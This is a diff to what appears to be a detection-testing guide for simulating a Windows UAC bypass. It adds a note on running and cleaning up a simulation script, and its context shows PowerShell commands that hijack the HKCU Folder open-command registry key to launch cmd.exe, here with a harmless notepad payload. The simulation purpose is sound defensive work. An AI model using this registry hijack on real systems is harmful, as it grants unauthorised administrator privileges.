@@ -6,6 +6,10 @@ UAC Bypass is a technique where attackers elevate their privileges to gain admin
 
 Run the following commands in PowerShell on a test device.
 
+> **Note:** Download the [simulation script here](Invoke-UACBypassSimulation.ps1).
+> To execute the simulation run the command `Invoke-UACBypassSimulation.ps1`.
+> To clean up the simulation run the command `Invoke-UACBypassSimulation.ps1 -CleanUp`.
+
 ```powershell
 New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'cmd.exe /c notepad.exe'
 New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
